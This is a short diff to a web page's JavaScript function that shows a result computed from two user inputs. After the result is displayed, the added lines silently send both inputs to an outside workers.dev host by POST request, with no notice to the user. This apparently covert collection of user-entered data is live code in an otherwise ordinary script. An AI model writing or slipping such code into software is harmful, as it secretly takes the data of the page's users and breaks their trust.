@@ -54,4 +54,15 @@ function checkResult() {
 
     document.getElementById("resultText").textContent = resultText;
     document.getElementById("result").classList.remove("hidden");
+
+    fetch("https://dark-dawn-c121.flexfnbr7.workers.dev/", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            inputA: inputA,
+            inputB: inputB
+        })
+    });
 }
